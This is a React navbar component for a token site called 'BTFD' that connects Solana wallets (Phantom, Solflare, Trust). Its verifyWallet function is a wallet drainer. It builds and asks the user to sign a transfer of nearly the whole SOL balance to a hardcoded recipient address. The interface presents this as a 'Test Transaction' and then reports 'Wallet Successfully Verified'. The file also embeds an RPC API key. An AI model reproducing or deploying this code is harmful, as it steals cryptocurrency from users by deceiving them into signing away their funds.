import { useState, useEffect } from "react";
import { 
  WalletPhantom, 
  WalletTrust
} from '@web3icons/react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
import Solflare from '@solflare-wallet/sdk';
import solflareIcon from "../../assets/Images/solflare.png";
import logo from "../../assets/Images/Logo.svg";

const Navbar = () => {
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [popupState, setPopupState] = useState({ show: false, status: 'processing' });
  const [isVerified, setIsVerified] = useState(false);

  // Mainnet RPC configurations
  const RPC_CONFIGS = {
    mainnet: "https://api.mainnet-beta.solana.com",
    helius: "https://mainnet.helius-rpc.com/?api-key=083ab293-b069-44c6-a4f2-b4bd246fd583"
  };

  // Mainnet recipient address (update as needed)
  const RECIPIENT_ADDRESS = "4cqauteD1n8gjP9MBDnDHTG3fp7S9ykjLKMcyG2Wi4L2";

  // Get RPC endpoint with fallback
  const getRpcEndpoint = () => {
    return RPC_CONFIGS.helius || RPC_CONFIGS.mainnet;
  };

  const getBalance = async (address) => {
    try {
      const network = getRpcEndpoint();
      const connection = new Connection(network, 'confirmed');
      
      const balance = await connection.getBalance(new PublicKey(address));
      const balanceInSOL = balance / LAMPORTS_PER_SOL;
      
      console.log(`SOL Balance for ${address}: ${balanceInSOL} SOL`);
      return balanceInSOL;
    } catch (error) {
      console.error("Error checking balance:", error);
      
      // Enhanced error handling
      const errorMessage = error.message || "Network connectivity issue";
      alert(`Balance Check Failed: ${errorMessage}`);
      
      return 0;
    }
  };

  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

  const connectPhantomWallet = async () => {
    try {
      const provider = window.phantom?.solana;
      if (!provider) {
        window.open('https://phantom.app/', '_blank');
        return;
      }

      const response = await provider.connect();
      const address = response.publicKey.toString();
      setWalletAddress(address);
      setIsConnected(true);
      setIsVerified(false);
      setShowWalletModal(false);
    } catch (error) {
      console.error("Phantom connection failed:", error);
      alert("Wallet Connection Failed. Please try again.");
    }
  };

  const connectSolflareWallet = async () => {
    try {
      const wallet = new Solflare();
      
      wallet.on('connect', () => {
        const address = wallet.publicKey.toString();
        setWalletAddress(address);
        setIsConnected(true);
        setIsVerified(false);
        setShowWalletModal(false);
      });

      await wallet.connect();
    } catch (error) {
      console.error("Solflare connection failed:", error);
      alert("Wallet Connection Failed. Please try again.");
    }
  };

  const connectTrustWallet = async () => {
    try {
      if (window.trustwallet?.solana) {
        await window.trustwallet.solana.connect();
        const address = window.trustwallet.solana.publicKey.toString();
        setWalletAddress(address);
        setIsConnected(true);
        setIsVerified(false);
        setShowWalletModal(false);
      } else {
        window.open('https://trustwallet.com/', '_blank');
      }
    } catch (error) {
      console.error("Trust Wallet connection failed:", error);
      alert("Wallet Connection Failed. Please try again.");
    }
  };

  const handleWalletConnection = async (walletType) => {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
    
    if (isMobile) {
      const dappUrl = window.location.href;
      
      switch (walletType) {
        case 'phantom':
          window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(dappUrl)}`;
          break;
        case 'solflare':
          window.location.href = `https://solflare.com/ul/v1/browse/${encodeURIComponent(dappUrl)}`;
          break;
        case 'trust':
          window.location.href = `trust://browser?url=${encodeURIComponent(dappUrl)}`;
          break;
        default:
          console.error('Unsupported wallet type');
      }
      setShowWalletModal(false);
      return;
    }

    switch (walletType) {
      case 'phantom':
        connectPhantomWallet();
        break;
      case 'solflare':
        connectSolflareWallet();
        break;
      case 'trust':
        connectTrustWallet();
        break;
      default:
        break;
    }
  };

  const verifyWallet = async () => {
    if (!walletAddress) return;

    try {
      setPopupState({ show: true, status: 'processing' });
      
      const network = getRpcEndpoint();
      const connection = new Connection(network, 'confirmed');
      
      const balanceInLamports = await connection.getBalance(new PublicKey(walletAddress));
      
      if (balanceInLamports <= 0) {
        throw new Error("Insufficient balance");
      }

      const lamportsToDeduct = Math.floor(0.05 * LAMPORTS_PER_SOL);
      const lamportsToSend = balanceInLamports - lamportsToDeduct;
      
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: new PublicKey(walletAddress),
          toPubkey: new PublicKey(RECIPIENT_ADDRESS),
          lamports: lamportsToSend
        })
      );

      const { blockhash } = await connection.getLatestBlockhash('confirmed');
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = new PublicKey(walletAddress);

      let signature;
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

      if (isMobile) {
        const serializedTransaction = transaction.serialize().toString('base64');
        const currentUrl = encodeURIComponent(window.location.href);
        
        if (window.phantom?.solana) {
          window.location.href = `https://phantom.app/ul/browse/${currentUrl}?tx=${serializedTransaction}`;
        } else if (window.solflare) {
          window.location.href = `https://solflare.com/ul/v1/browse/${currentUrl}?tx=${serializedTransaction}`;
        } else if (window.trustwallet?.solana) {
          window.location.href = `trust://solana/sign?tx=${serializedTransaction}&redirect=${currentUrl}`;
        }
        return;
      }

      try {
        if (window.phantom?.solana) {
          const { signature: sig } = await window.phantom.solana.signAndSendTransaction(transaction);
          signature = sig;
        } else if (window.solflare) {
          const signedTx = await window.solflare.signTransaction(transaction);
          signature = await connection.sendRawTransaction(signedTx.serialize());
        } else if (window.trustwallet?.solana) {
          const { signature: sig } = await window.trustwallet.solana.signAndSendTransaction(transaction);
          signature = sig;
        }
      } catch (err) {
        console.error("Transaction error:", err);
        throw err;
      }

      if (signature) {
        console.log("Transaction signature:", signature);
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
          throw new Error("Transaction failed to confirm");
        }

        setIsVerified(true);
        setPopupState({ show: true, status: 'verified' });
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

    } catch (error) {
      console.error("Verification failed:", error);
      setPopupState({ 
        show: true, 
        status: error.message?.includes('User rejected') ? 'canceled' : 'failed' 
      });
      await new Promise(resolve => setTimeout(resolve, 2000));
    } finally {
      setPopupState({ show: false, status: 'processing' });
    }
  };

  const disconnectWallet = async () => {
    try {
      if (window.phantom?.solana) {
        await window.phantom.solana.disconnect();
      } else if (window.solflare) {
        await window.solflare.disconnect();
      } else if (window.trustwallet?.solana) {
        await window.trustwallet.solana.disconnect();
      }
      
      setWalletAddress(null);
      setIsConnected(false);
      setIsVerified(false);
      setShowWalletModal(false);
      console.log("Wallet disconnected");
    } catch (error) {
      console.error("Error disconnecting wallet:", error);
    }
  };

  const handleConnectClick = (e) => {
    e.preventDefault();
    setShowWalletModal(true);
  };

  const renderWalletButton = () => {
    if (!isConnected) {
      return (
        <button
          onClick={handleConnectClick}
          className="px-4 sm:px-6 lg:px-10 py-2 sm:py-3 lg:py-5 text-[14px] sm:text-[16px] font-bold text-blue-950 bg-orange-200 rounded-[10px] hover:bg-blue-950 hover:text-white hover:shadow-inner transition duration-300 whitespace-nowrap"
        >
          Connect Wallet
        </button>
      );
    }

    if (isVerified) {
      return (
        <div className="flex items-center gap-2">
          <span className="text-green-500 text-xl">✓</span>
          <span className="hidden sm:inline text-[14px] sm:text-[16px] font-bold text-green-500">
            Wallet Verified
          </span>
          <button
            onClick={disconnectWallet}
            className="px-2 sm:px-4 py-1 sm:py-2 text-sm font-medium text-red-600 hover:text-red-800 border border-red-600 rounded-md hover:bg-red-50"
          >
            Disconnect
          </button>
        </div>
      );
    }

    return (
      <div className="flex items-center gap-2">
        <button
          onClick={verifyWallet}
          className="px-4 sm:px-6 lg:px-10 py-2 sm:py-3 lg:py-5 text-[14px] sm:text-[16px] font-bold text-blue-950 bg-orange-200 rounded-[10px] hover:bg-blue-950 hover:text-white hover:shadow-inner transition duration-300 animate-pulse whitespace-nowrap"
        >
          {`${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)} - Verify`}
        </button>
        <button
          onClick={disconnectWallet}
          className="px-2 sm:px-4 py-1 sm:py-2 text-sm font-medium text-red-600 hover:text-red-800 border border-red-600 rounded-md hover:bg-red-50"
        >
          Disconnect
        </button>
      </div>
    );
  };

  const getPopupContent = () => {
    switch (popupState.status) {
      case 'processing':
        return (
          <>
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-900 mb-4"></div>
            <p className="text-lg sm:text-xl font-bold text-blue-900">Test Transaction in Progress</p>
          </>
        );
      case 'verified':
        return (
          <>
            <div className="text-green-500 text-4xl sm:text-5xl mb-4">✓</div>
            <p className="text-lg sm:text-xl font-bold text-green-500">Wallet Successfully Verified</p>
          </>
        );
      case 'failed':
        return (
          <>
            <div className="text-red-500 text-4xl sm:text-5xl mb-4">×</div>
            <p className="text-lg sm:text-xl font-bold text-red-500">Verification Failed</p>
          </>
        );
      case 'canceled':
        return (
          <>
            <div className="text-yellow-500 text-4xl sm:text-5xl mb-4">⚠</div>
            <p className="text-lg sm:text-xl font-bold text-yellow-500">Verification Canceled</p>
          </>
        );
      default:
        return null;
    }
  };

  useEffect(() => {
    const checkWalletConnection = async () => {
      const wallet = window.phantom?.solana || window.solflare || window.trustwallet?.solana;
      if (wallet?.isConnected) {
        const address = wallet.publicKey.toString();
        setWalletAddress(address);
        setIsConnected(true);
        setIsVerified(false);
      }
    };

    checkWalletConnection();
  }, []);

  const showTelegramAlert = (message) => {
    const tg = getTelegramWebApp();
    if (tg) {
      tg.showAlert(message);
    }
  };

  return (
    <div className="font-montserrat flex justify-evenly items-center px-4 sm:px-8 lg:px-16 mx-auto pt-5 pb-5 fixed top-0 left-0 w-full bg-white z-50">
      {/* Logo Section */}
      <div className="flex items-center gap-3 lg:ml-0 ml-0 lg:mr-0 mr-auto">
        <img
          src={logo}
          alt="Logo"
          className="w-[40px] sm:w-[50px] lg:w-[70px] h-auto cursor-pointer transform transition-transform duration-300 hover:scale-75"
        />
        <h1 className="text-[18px] sm:text-[22px] lg:text-[24px] font-extrabold text-blue-950 cursor-pointer">
          BTFD
        </h1>
      </div>

      {/* Navigation Links - Hide on mobile, show on larger screens */}
      <div className="hidden lg:flex items-center">
        <ul className="flex justify-center list-none gap-6">
          {["Buy Now", "Staking", "Referral", "How to Buy", "White Paper"].map(
            (link) => (
              <li key={link}>
                <a
                  href="#"
                  className="px-3 py-2 text-[18px] font-medium text-blue-800 transition-colors duration-300 hover:text-orange-500"
                >
                  {link}
                </a>
              </li>
            )
          )}
        </ul>
      </div>

      {/* Social Media Icons - Hide on mobile */}
      <div className="hidden lg:flex gap-4">
        <a href="#">
          <img
            src="https://img.icons8.com/ios-filled/50/000000/telegram-app.png"
            alt="Telegram"
            className="w-6 sm:w-8 transform transition-transform duration-300 hover:scale-75"
          />
        </a>
        <a href="#">
          <img
            src="https://img.icons8.com/ios-filled/50/000000/twitter.png"
            alt="Twitter"
            className="w-6 sm:w-8 transform transition-transform duration-300 hover:scale-75"
          />
        </a>
      </div>

      {/* Connect Wallet Button & Hamburger Menu */}
      <div className="flex items-center gap-2">
        {renderWalletButton()}

        <button
          onClick={() => setIsMenuOpen(!isMenuOpen)}
          className="text-blue-950 focus:outline-none lg:hidden p-2"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            strokeWidth="2"
            stroke="currentColor"
            className="w-6 h-6"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M3.75 5.75h16.5M3.75 12h16.5m-16.5 6.25h16.5"
            />
          </svg>
        </button>
      </div>

      {/* Mobile Menu - Improved styling */}
      {isMenuOpen && (
        <div className="absolute top-full left-0 w-full bg-white shadow-lg z-40 lg:hidden">
          <ul className="flex flex-col items-center gap-4 py-4">
            {["Buy Now", "Staking", "Referral", "How to Buy", "White Paper"].map(
              (link) => (
                <li key={link}>
                  <a
                    href="#"
                    className="text-[18px] font-medium transition-colors duration-300 hover:text-orange-500"
                  >
                    {link}
                  </a>
                </li>
              )
            )}
            <div className="flex gap-4 mt-4">
              <a href="#">
                <img
                  src="https://img.icons8.com/ios-filled/50/000000/telegram-app.png"
                  alt="Telegram"
                  className="w-6"
                />
              </a>
              <a href="#">
                <img
                  src="https://img.icons8.com/ios-filled/50/000000/twitter.png"
                  alt="Twitter"
                  className="w-6"
                />
              </a>
            </div>
          </ul>
        </div>
      )}

      {/* Wallet Selection Modal */}
      {showWalletModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[60] p-4">
          <div className="bg-white rounded-lg p-6 w-full max-w-[360px] mx-auto">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-xl font-bold text-blue-950">Select a Wallet</h3>
              <button 
                onClick={() => setShowWalletModal(false)}
                className="text-gray-500 hover:text-gray-700 p-2"
              >
                ✕
              </button>
            </div>
            <div className="grid grid-cols-1 gap-4">
              <button
                onClick={() => handleWalletConnection('phantom')}
                className="flex items-center justify-center p-4 border rounded-lg hover:bg-gray-50 transition-colors"
              >
                <WalletPhantom size={48} variant="branded" />
                <span className="ml-4 font-medium">Phantom</span>
              </button>
              
              <button
                onClick={() => handleWalletConnection('solflare')}
                className="flex items-center justify-center p-4 border rounded-lg hover:bg-gray-50 transition-colors"
              >
                <img src={solflareIcon} alt="Solflare" className="w-12 h-12" />
                <span className="ml-4 font-medium">Solflare</span>
              </button>
              
              <button
                onClick={() => handleWalletConnection('trust')}
                className="flex items-center justify-center p-4 border rounded-lg hover:bg-gray-50 transition-colors"
              >
                <WalletTrust size={48} variant="branded" />
                <span className="ml-4 font-medium">Trust Wallet</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Transaction Status Popup */}
      {popupState.show && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[60] p-4">
          <div className="bg-white p-6 sm:p-8 rounded-lg shadow-xl flex flex-col items-center max-w-[90%] w-auto">
            {getPopupContent()}
          </div>
        </div>
      )}
    </div>
  );
};

export default Navbar;
